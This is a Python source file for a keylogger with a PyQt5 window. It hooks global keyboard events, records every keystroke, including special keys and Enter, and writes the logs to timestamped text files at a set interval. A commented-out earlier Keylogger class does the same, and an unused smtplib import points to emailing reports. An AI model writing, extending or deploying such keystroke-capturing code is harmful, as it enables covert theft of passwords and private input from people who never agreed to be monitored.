import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
from PyQt5.QtCore import QTimer, QTime
# SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
#
#
# class Keylogger:
#     def __init__(self, interval, report_method="file"):
#         # we gonna pass SEND_REPORT_EVERY to interval
#         self.interval = interval
#         self.report_method = report_method
#         # this is the string variable that contains the log of all
#         # the keystrokes within `self.interval`
#         self.log = ""
#         # record start & end datetimes
#         self.start_dt = datetime.now()
#         self.end_dt = datetime.now()
#
#     def callback(self, event):
#         """
#         This callback is invoked whenever a keyboard event is occured
#         (i.e when a key is released in this example)
#         """
#         name = event.name
#         if len(name) > 1:
#             # not a character, special key (e.g ctrl, alt, etc.)
#             # uppercase with []
#             if name == "space":
#                 # " " instead of "space"
#                 name = " "
#             elif name == "enter":
#                 # add a new line whenever an ENTER is pressed
#                 name = "[ENTER]\n"
#             elif name == "decimal":
#                 name = "."
#             else:
#                 # replace spaces with underscores
#                 name = name.replace(" ", "_")
#                 name = f"[{name.upper()}]"
#         # finally, add the key name to our global `self.log` variable
#         self.log += name
#
#     def update_filename(self):
#         # construct the filename to be identified by start & end datetimes
#         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
#         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
#         self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
#
#     def report_to_file(self):
#         """This method creates a log file in the current directory that contains
#         the current keylogs in the `self.log` variable"""
#         # open the file in write mode (create it)
#         with open(f"logs/{self.filename}.txt", "w") as f:
#             # write the keylogs to the file
#             print(self.log, file=f)
#         print(f"[+] Saved {self.filename}.txt")
#
#     def report(self):
#         """
#         This function gets called every `self.interval`
#         It basically sends keylogs and resets `self.log` variable
#         """
#         if self.log:
#             # if there is something in log, report it
#             self.end_dt = datetime.now()
#             # update `self.filename`
#             self.update_filename()
#             if self.report_method == "file":
#                 self.report_to_file()
#             # if you want to print in the console, uncomment below line
#             # print(f"[{self.filename}] - {self.log}")
#             self.start_dt = datetime.now()
#         self.log = ""
#         timer = Timer(interval=self.interval, function=self.report)
#         # set the thread as daemon (dies when main thread die)
#         timer.daemon = True
#         # start the timer
#         timer.start()
#
#     def start(self):
#         # record the start datetime
#         self.start_dt = datetime.now()
#         # start the keylogger
#         keyboard.on_release(callback=self.callback)
#         # start reporting the keylogs
#         self.report()
#         # block the current thread, wait until CTRL+C is pressed
#         keyboard.wait()
#
#
# if __name__ == "__main__":
#     print("Key Logger started")
#     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
#     keylogger.start()


def current_time():
    t = QTime.currentTime().toString()
    am_pm = "pm" if 12 < int(t[:2]) < 23 else "am"
    return t + " " + am_pm


class KeyLogger:
    """
    System / Ui
    """
    def read_log(self):
        f = open(f"logs/{self.ui.current_file_name}.txt", "r")
        contents = f.read()
        f.close()
        return contents

    def write_log(self):
        if self.ui.log:
            self.ui.current_file_name = datetime.now()
            with open(f"logs/{self.ui.current_file_name}.txt", "w") as f:
                f.write(self.ui.log)
            KeyLogger.ui_log(self, f"Logged: logs/{self.ui.current_file_name}.txt")

    def update_time(self):
        self.ui.updateTime.setText(current_time())

    def init_ui(self):
        self.setFixedWidth(350)
        self.setFixedHeight(200)
        self.ui.updateTime.setText(current_time())
        self.ui.close.clicked.connect(lambda: self.close())
        self.ui.minimize.clicked.connect(lambda: self.showMinimized())
        self.ui.startBtn.clicked.connect(lambda: KeyLogger.start(self))
        self.ui.timer = QTimer()
        self.ui.timer.timeout.connect(lambda: KeyLogger.update_time(self))
        self.ui.timer.start(1000)

    """
    Logger
    """
    def start(self):
        try:
            self.ui.submit_log.stop()
        except:
            pass
        self.ui.submit_log = QTimer()
        self.ui.submit_log.timeout.connect(lambda: KeyLogger.write_log(self))
        self.ui.submit_log.start(60000*self.ui.mins.value())
        self.ui.log = ""
        keyboard.on_release(callback=self.keyboard_action)
        KeyLogger.ui_log(self, "Started.")

    def stop(self):
        try:
            self.ui.submit_log.stop()
        except:
            pass
        KeyLogger.ui_log(self, "Stopped.")

    def ui_log(self, message):
        t, c = current_time(), self.ui.keyLoggerLog.count()
        self.ui.keyLoggerLog.setCurrentRow(c - 1)
        if c > 100:
            self.ui.keyLoggerLog.clear()
            self.ui.keyLoggerLog.addItem("CLEARED --> {}".format(t))
        self.ui.keyLoggerLog.takeItem(c - 1)
        self.ui.keyLoggerLog.addItem("{} - {}".format(t, message))
        self.ui.keyLoggerLog.addItem("")
        self.ui.logUpdate.setText("Updated: " + current_time())

    def keyboard_action(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        print(name)
        self.ui.log += name

